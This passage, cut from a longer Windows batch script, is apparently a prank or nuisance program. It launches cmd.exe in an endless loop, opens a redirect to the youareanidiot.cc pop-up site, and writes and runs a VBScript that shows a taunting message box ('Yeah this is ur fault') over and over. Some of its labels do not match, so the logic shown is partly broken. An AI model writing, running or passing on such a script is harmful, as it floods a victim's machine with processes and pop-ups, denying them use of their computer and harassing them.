...
start cmd.exe
goto loop
start https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwijy9Hq1q-CAxX6SvEDHRrLDh8QFnoECBQQAQ&url=https%3A%2F%2Fyouareanidiot.cc%2F&usg=AOvVaw36hjTACmKPOCzJrY34wLQm&opi=89978449
goto looop
echo do>>msg.vbs
echo Msgbox"As ive warned before",0+0,"Yeah this is ur fault">>msg.vbs
echo loop>>msg.vbs
start msg.vbs
